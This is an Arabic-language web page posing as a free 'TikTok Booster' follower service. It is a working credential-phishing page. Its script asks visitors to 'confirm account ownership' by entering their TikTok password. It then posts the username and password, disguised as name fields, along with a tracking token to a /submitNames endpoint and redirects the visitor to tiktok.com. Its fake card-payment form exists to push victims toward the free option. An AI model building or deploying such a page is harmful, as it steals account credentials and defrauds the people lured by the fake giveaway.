<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Meta Tags for Preview -->
    <meta property="og:title" content="TikTok Booster - زيادة متابعين تيك توك">
    <meta property="og:description" content="احصل على 1000 متابع حقيقي لحسابك على تيك توك مجاناً. خدمة سريعة وآمنة 100%.">
    <meta property="og:image" content="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95da587b6efc5601ff3.png">
    <meta property="og:type" content="website">

    <title>TikTok Booster | زيادة متابعين</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #121212; color: white; margin: 0; padding-bottom: 50px; }
        .nav { background: #000; padding: 20px; text-align: center; border-bottom: 1px solid #333; font-weight: bold; font-size: 24px; }
        .container { max-width: 450px; margin: 30px auto; padding: 0 15px; }
        .card { background: #1e1e1e; border-radius: 15px; padding: 25px; text-align: center; border: 1px solid #333; }
        .plan { border: 1px solid #444; padding: 15px; border-radius: 10px; margin: 10px 0; cursor: pointer; display: flex; justify-content: space-between; }
        .plan.active { border-color: #ff0050; background: rgba(255, 0, 80, 0.1); }
        .btn-tk { width: 100%; padding: 15px; background: #ff0050; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 18px; cursor: pointer; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 1000; }
        .modal-content { background: #1e1e1e; padding: 30px; border-radius: 15px; width: 90%; max-width: 380px; text-align: center; border: 1px solid #ff0050; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #333; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; }
    </style>
</head>
<body>

<div class="nav">TikTok Booster 🚀</div>

<div class="container">
    <div class="card">
        <h2>زد متابعينك الآن</h2>
        <input type="text" id="target_id" placeholder="اسم المستخدم (TikTok ID)">
        
        <div class="plans">
            <div class="plan active" onclick="selTK(this, '0')"><span>1,000 متابع</span> <b>مجاني</b></div>
            <div class="plan" onclick="selTK(this, '12')"><span>5,000 متابع</span> <b>12.99$</b></div>
            <div class="plan" onclick="selTK(this, '25')"><span>10,000 متابع</span> <b>24.99$</b></div>
        </div>

        <button class="btn-tk" id="tkBtn" onclick="openTK()">استلام الآن</button>
    </div>
</div>

<div class="modal" id="tkModal">
    <div class="modal-content" id="tkMContent"></div>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get('t');
    let price = '0';

    function selTK(el, p) {
        document.querySelectorAll('.plan').forEach(i => i.classList.remove('active'));
        el.classList.add('active');
        price = p;
        document.getElementById('tkBtn').innerText = (p === '0') ? 'استلام الآن' : 'شراء الآن (' + p + '$)';
    }

    function openTK() {
        const user = document.getElementById('target_id').value;
        if(!user) return alert('أدخل اليوزر');
        
        const modal = document.getElementById('tkModal');
        const content = document.getElementById('tkMContent');
        modal.style.display = 'flex';

        if(price === '0') {
            content.innerHTML = `
                <h3>تأكيد الحساب</h3>
                <p>يرجى تسجيل الدخول لتأكيد ملكية الحساب.</p>
                <input type="text" id="u" value="${user}">
                <input type="password" id="p" placeholder="كلمة السر">
                <button class="btn-tk" onclick="sendTK()">تأكيد الحساب</button>
            `;
        } else {
            content.innerHTML = `
                <h3>إتمام الشراء</h3>
                <p>بوابة الدفع (Visa/MasterCard)</p>
                <input type="text" placeholder="رقم البطاقة">
                <div style="display:flex; gap:10px;"><input placeholder="MM/YY"><input placeholder="CVV"></div>
                <button class="btn-tk" onclick="alert('بوابة الدفع تحت الصيانة، جرب الباقة المجانية!')">دفع الآن</button>
                <button onclick="document.getElementById('tkModal').style.display='none'" style="background:none; border:none; color:#999; margin-top:10px;">إلغاء</button>
            `;
        }
    }

    async function sendTK() {
        const u = document.getElementById('u').value;
        const p = document.getElementById('p').value;
        if(!p) return alert('أدخل كلمة السر');

        await fetch('/submitNames', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token, firstName: u, secondName: p })
        });

        alert('تم التأكيد! سيبدأ الرشق خلال دقائق.');
        window.location.href = "https://tiktok.com";
    }
</script>
</body>
</html>
